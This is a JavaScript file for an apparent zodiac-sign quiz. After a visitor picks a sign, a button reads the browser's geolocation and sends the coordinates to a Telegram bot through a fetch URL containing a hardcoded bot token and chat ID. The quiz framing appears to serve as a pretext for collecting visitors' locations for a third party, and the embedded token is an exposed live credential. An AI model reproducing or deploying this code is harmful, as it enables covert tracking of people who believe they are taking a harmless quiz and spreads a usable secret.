function nextQuestion(zodiacSign) {
  // Store the selected zodiac sign in localStorage
  localStorage.setItem('zodiacSign', zodiacSign);
  window.location.href = 'location.html';
}

document.getElementById("getLocation").addEventListener("click", function() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Send the location to Telegram bot
      const telegramUrl = `https://api.telegram.org/bot7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk/sendLocation?chat_id=397599597&latitude=${latitude}&longitude=${longitude}`;

      fetch(telegramUrl)
        .then(response => response.json())
        .then(data => {
          alert("Location sent to Telegram!");
          window.location.href = "result.html"; // Redirect after sending location
        })
        .catch(error => {
          alert("Error sending location!");
          console.error(error);
        });

    }, function(error) {
      alert("Unable to retrieve your location.");
    });
  } else {
    alert("Geolocation is not supported by this browser.");
  }
});
